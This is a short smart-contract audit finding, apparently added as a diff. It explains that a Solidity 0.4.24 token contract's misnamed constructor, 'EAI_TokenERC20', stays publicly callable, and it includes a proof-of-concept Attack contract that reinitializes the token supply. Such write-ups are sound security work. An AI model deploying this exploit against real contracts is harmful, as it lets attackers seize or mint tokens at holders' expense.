@@ -1,0 +1,24 @@
+1. Vulnerable Function: EAI_TokenERC20 (approx. lines 15–23)
+
+Reason:
+• In Solidity 0.4.24 the constructor should have the same name as the contract—in this case “EAI_TokenERC” – but the function is instead named “EAI_TokenERC20”. This misnaming causes the function to be treated as a normal public function rather than a one‐time constructor.
+• As a result, any user can call EAI_TokenERC20 and reinitialize the token’s totalSupply, balanceOf[msg.sender], name, and symbol. An attacker could thereby reset the token distribution, effectively allowing them to mint tokens for themselves.
+
+Proof of Concept:
+An attacker may execute the following code (e.g., via a transaction) to seize control of the token supply:
+
+------------------------------------------------------------
+contract Attack {
+    EAI_TokenERC token;
+    constructor(address _tokenAddress) public {
+        token = EAI_TokenERC(_tokenAddress);
+    }
+
+    function attack(uint256 newSupply, string tokenName, string tokenSymbol) public {
+        // Since EAI_TokenERC20 is public, this call reinitializes the token
+        token.EAI_TokenERC20(newSupply, tokenName, tokenSymbol);
+    }
+}
+------------------------------------------------------------
+
+The above PoC shows that the public function EAI_TokenERC20 can be misused to reassign the total token supply, effectively allowing unauthorized control over the token’s distribution.
